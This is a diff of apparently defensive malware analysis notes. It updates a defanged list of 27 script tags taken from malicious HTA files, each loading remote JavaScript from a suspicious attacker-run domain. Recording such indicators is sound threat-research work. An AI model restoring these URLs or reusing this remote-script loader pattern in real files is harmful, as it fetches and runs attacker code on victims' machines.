@@ -90,33 +90,33 @@ e7848c2693e35d136a01bb04a91452e6a7a6e2526ef347d14fd601d8bd78108f - 1,119 bytes -
 
 27 LINES OF SCRIPT FROM THE ABOVE HTA FILES:
 
-<script src="hxxp[:]//ae2bc3bf.bright-witted[.]skin/2f6mlq45pn3u9"></script>
-<script src="hxxp[:]//39eacf27.concurrences[.]makeup/3vdl1kg5fv49e"></script>
-<script src="hxxp[:]//aee0f533.deoppilant[.]monster/26tgtvr5f3it6"></script>
-<script src="hxxp[:]//bff7ca72.deoppilant[.]monster/1n1mr3l5f621i"></script>
-<script src="hxxp[:]//76f2f947.dogtrotted[.]cyou/2q8a1p459eu4o"></script>
-<script src="hxxp[:]//5b20be63.free-handedness[.]yachts/3chr6ho5akd2r"></script>
-<script src="hxxp[:]//7fd6f7f7.luminosity[.]lol/30uakkj5ff50g"></script>
-<script src="hxxp[:]//add1acc4.luminosity[.]lol/oiok1v5feihp"></script>
-<script src="hxxp[:]//24306d7b.malalignment[.]bond/8oohbu5b67ae"></script>
-<script src="hxxp[:]//555248d6.noncancerous[.]beauty/1a2jjo15b9ua9"></script>
-<script src="hxxp[:]//9d5d9876.rhinophidae[.]bond/18flme75dov33"></script>
-<script src="hxxp[:]//80910c15.simple-life[.]lol/1e9en94560uac"></script>
-<script src="hxxp[:]//b896c64b.simple-life[.]lol/11ela4054hp82"></script>
-<script src="hxxp[:]//d0fddb88.simple-life[.]lol/3blnmuc54vlkl"></script>
-<script src="hxxp[:]//eb175142.simple-life[.]lol/2ukgtfq54coru"></script>
-<script src="hxxp[:]//7c7eb2e6.sulphamidic[.]mom/39ojo545fp2r3"></script>
-<script src="hxxp[:]//1ba7e0c7.summer-breathing[.]motorcycles/3nf1gn95hmt0i"></script>
-<script src="hxxp[:]//52a124a7.summer-breathing[.]motorcycles/j8unnt5hqm8j"></script>
-<script src="hxxp[:]//a570fa56.summer-breathing[.]motorcycles/2nlvm745j3fe8"></script>
-<script src="hxxp[:]//c7e3e877.summer-breathing[.]motorcycles/r26np85j3nn3"></script>
-<script src="hxxp[:]//f3612111.summer-breathing[.]motorcycles/2nigjnv5i8q39"></script>
-<script src="hxxp[:]//c47fabc0.superaccumulate[.]mom/32efsui57agee"></script>
-<script src="hxxp[:]//312fe387.unfoolishly[.]christmas/14tm67d53r7on"></script>
-<script src="hxxp[:]//9973914b.uteromaniacal[.]makeup/1hvl3o3586u9t"></script>
-<script src="hxxp[:]//11355b83.viticulture[.]rest/e015865mctbb"></script>
-<script src="hxxp[:]//2c64bb87.viticulture[.]rest/7rchv15l7viv"></script>
-<script src="hxxp[:]//a74a8d08.viticulture[.]rest/279oaip5mtpre"></script>
+<script src="hxxps[:]//ae2bc3bf.bright-witted[.]skin/2f6mlq45pn3u9"></script>
+<script src="hxxps[:]//39eacf27.concurrences[.]makeup/3vdl1kg5fv49e"></script>
+<script src="hxxps[:]//aee0f533.deoppilant[.]monster/26tgtvr5f3it6"></script>
+<script src="hxxps[:]//bff7ca72.deoppilant[.]monster/1n1mr3l5f621i"></script>
+<script src="hxxps[:]//76f2f947.dogtrotted[.]cyou/2q8a1p459eu4o"></script>
+<script src="hxxps[:]//5b20be63.free-handedness[.]yachts/3chr6ho5akd2r"></script>
+<script src="hxxps[:]//7fd6f7f7.luminosity[.]lol/30uakkj5ff50g"></script>
+<script src="hxxps[:]//add1acc4.luminosity[.]lol/oiok1v5feihp"></script>
+<script src="hxxps[:]//24306d7b.malalignment[.]bond/8oohbu5b67ae"></script>
+<script src="hxxps[:]//555248d6.noncancerous[.]beauty/1a2jjo15b9ua9"></script>
+<script src="hxxps[:]//9d5d9876.rhinophidae[.]bond/18flme75dov33"></script>
+<script src="hxxps[:]//80910c15.simple-life[.]lol/1e9en94560uac"></script>
+<script src="hxxps[:]//b896c64b.simple-life[.]lol/11ela4054hp82"></script>
+<script src="hxxps[:]//d0fddb88.simple-life[.]lol/3blnmuc54vlkl"></script>
+<script src="hxxps[:]//eb175142.simple-life[.]lol/2ukgtfq54coru"></script>
+<script src="hxxps[:]//7c7eb2e6.sulphamidic[.]mom/39ojo545fp2r3"></script>
+<script src="hxxps[:]//1ba7e0c7.summer-breathing[.]motorcycles/3nf1gn95hmt0i"></script>
+<script src="hxxps[:]//52a124a7.summer-breathing[.]motorcycles/j8unnt5hqm8j"></script>
+<script src="hxxps[:]//a570fa56.summer-breathing[.]motorcycles/2nlvm745j3fe8"></script>
+<script src="hxxps[:]//c7e3e877.summer-breathing[.]motorcycles/r26np85j3nn3"></script>
+<script src="hxxps[:]//f3612111.summer-breathing[.]motorcycles/2nigjnv5i8q39"></script>
+<script src="hxxps[:]//c47fabc0.superaccumulate[.]mom/32efsui57agee"></script>
+<script src="hxxps[:]//312fe387.unfoolishly[.]christmas/14tm67d53r7on"></script>
+<script src="hxxps[:]//9973914b.uteromaniacal[.]makeup/1hvl3o3586u9t"></script>
+<script src="hxxps[:]//11355b83.viticulture[.]rest/e015865mctbb"></script>
+<script src="hxxps[:]//2c64bb87.viticulture[.]rest/7rchv15l7viv"></script>
+<script src="hxxps[:]//a74a8d08.viticulture[.]rest/279oaip5mtpre"></script>
 
 EXAMPLE OF COMMANDS FROM THE SCRIPT RETURNED FROM ONE OF THE ABOVE URLS ON 2024-11-14:
 
